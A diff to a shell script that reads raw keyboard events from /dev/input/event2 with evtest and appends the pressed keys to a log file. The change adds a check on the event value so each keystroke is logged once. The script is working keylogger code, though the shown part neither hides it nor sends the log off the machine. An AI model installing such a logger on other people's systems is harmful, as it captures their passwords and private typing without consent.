@@ -8,12 +8,16 @@ fi
 
 input_device="/dev/input/event2"
 
-evtest "$input_device"| grep --line-buffered "Event: time" | while read -r line
+evtest "$input_device"| grep --line-buffered "Event: time" | while read line
 do
 
 	index=$(echo $line | egrep "KEY" | egrep -o "code [0-9]+" | egrep -o -m 1 "[0-9]+" )
+	value=$(echo $line | egrep "KEY" | egrep -o 'value [0-9]' | egrep -o 0)
+	
 	if [[ $(echo $index) ]]
 	then
+		if [[ $(echo $value) ]]
+		then
 		case $index in
 			2) printf 1 >> logTaste.txt ;;
 			3) printf 2 >> logTaste.txt ;;
@@ -72,6 +76,7 @@ do
 			58) printf 'CAPSLOCK' >> logTaste.txt ;;
 			*) echo 0 > /dev/null ;; 
 		esac
+		fi
 	fi
 done
 
